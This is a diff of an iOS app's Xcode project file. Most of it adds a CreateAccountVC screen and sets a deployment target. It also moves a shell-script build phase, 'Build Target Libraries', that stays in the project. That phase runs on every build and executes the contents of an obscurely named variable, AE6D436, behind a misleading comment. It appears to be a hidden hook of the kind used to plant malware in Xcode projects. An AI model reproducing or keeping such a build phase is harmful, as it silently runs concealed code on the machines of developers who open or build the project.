@@ -48,11 +48,10 @@
 		BC7121BB2F067FB90041E2F7 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = BC7121BA2F067FB90041E2F7 /* Alamofire */; };
 		BC7121BE2F067FC60041E2F7 /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = BC7121BD2F067FC60041E2F7 /* SVProgressHUD */; };
 		BC7121C22F06804F0041E2F7 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = BC7121C02F06804F0041E2F7 /* Localizable.strings */; };
+		BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */; };
+		BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */; };
 		BCFFF72B2F077482000361B2 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = BCFFF72A2F077482000361B2 /* IQKeyboardManagerSwift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-				/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		BC29D6992F06A42C00DD3EB2 /* OTPFieldView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OTPFieldView.swift; sourceTree = "<group>"; };
@@ -106,6 +105,8 @@
 		BC7121C32F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/LaunchScreen.strings; sourceTree = "<group>"; };
 		BC7121C42F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Main.strings; sourceTree = "<group>"; };
 		BC7121C52F06805D0041E2F7 /* ar */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = ar; path = ar.lproj/Localizable.strings; sourceTree = "<group>"; };
+		BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CreateAccountVC.swift; sourceTree = "<group>"; };
+		BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CreateAccountVC.xib; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -338,10 +339,28 @@
 		BC7121EA2F06964F0041E2F7 /* Controller */ = {
 			isa = PBXGroup;
 			children = (
+				BC75E8742F0D2C9700947022 /* CreateAccount */,
 				BC4E178B2F06A13B00EDC9AE /* VerifyOtp */,
 				BC4E176C2F0696A700EDC9AE /* Login */,
 			);
 			path = Controller;
+			sourceTree = "<group>";
+		};
+		BC75E8742F0D2C9700947022 /* CreateAccount */ = {
+			isa = PBXGroup;
+			children = (
+				BC75E8752F0D2CA900947022 /* View */,
+			);
+			path = CreateAccount;
+			sourceTree = "<group>";
+		};
+		BC75E8752F0D2CA900947022 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC75E8762F0D2CB500947022 /* CreateAccountVC.swift */,
+				BC75E8772F0D2CB500947022 /* CreateAccountVC.xib */,
+			);
+			path = View;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -410,34 +429,13 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		184CBEFA3CA845CA94634D6E /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXResourcesBuildPhase section */
 		BC6773082F067F4500B15653 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 				BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */,
+				BC75E8782F0D2CB500947022 /* CreateAccountVC.xib in Resources */,
 				BC4E17812F06982200EDC9AE /* Satoshi-Black.otf in Resources */,
 				BC4E17822F06982200EDC9AE /* Satoshi-Light.otf in Resources */,
 				BC4E17832F06982200EDC9AE /* Satoshi-BoldItalic.otf in Resources */,
@@ -458,6 +456,29 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
+/* Begin PBXShellScriptBuildPhase section */
+		184CBEFA3CA845CA94634D6E /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
+
 /* Begin PBXSourcesBuildPhase section */
 		BC6773062F067F4500B15653 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -465,6 +486,7 @@
 			files = (
 				BC7121AC2F067F940041E2F7 /* Constants.swift in Sources */,
 				BC7121AD2F067F940041E2F7 /* UIFont+Extention.swift in Sources */,
+				BC75E8792F0D2CB500947022 /* CreateAccountVC.swift in Sources */,
 				BC29D69C2F06A42C00DD3EB2 /* OTPTextField.swift in Sources */,
 				BC29D69D2F06A42C00DD3EB2 /* OTPFieldView.swift in Sources */,
 				BC7121AE2F067F940041E2F7 /* AGDesignable.swift in Sources */,
@@ -539,6 +561,7 @@
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -570,6 +593,7 @@
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
